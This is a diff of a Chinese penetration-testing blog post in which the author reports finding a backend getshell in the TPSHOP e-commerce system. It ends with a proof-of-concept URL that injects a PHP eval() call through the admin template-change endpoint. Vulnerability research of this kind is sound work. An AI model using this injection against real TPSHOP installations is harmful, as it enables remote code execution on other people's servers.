@@ -7,11 +7,11 @@ tags:
 categories: 渗透
 ---
 
-萌新最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我这萌新找了个后台getshell，调了很久，终于调通了POC
+最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC
 
 <!-- more -->
 
-萌新最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我这萌新找了个后台getshell，调了很久，终于调通了POC
+最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我找了个后台getshell，调了很久，终于调通了POC
 
 http://xxx/index.php/Admin/template/changeTemplate/key/'.eval('echo 123;').'/t/pc
 
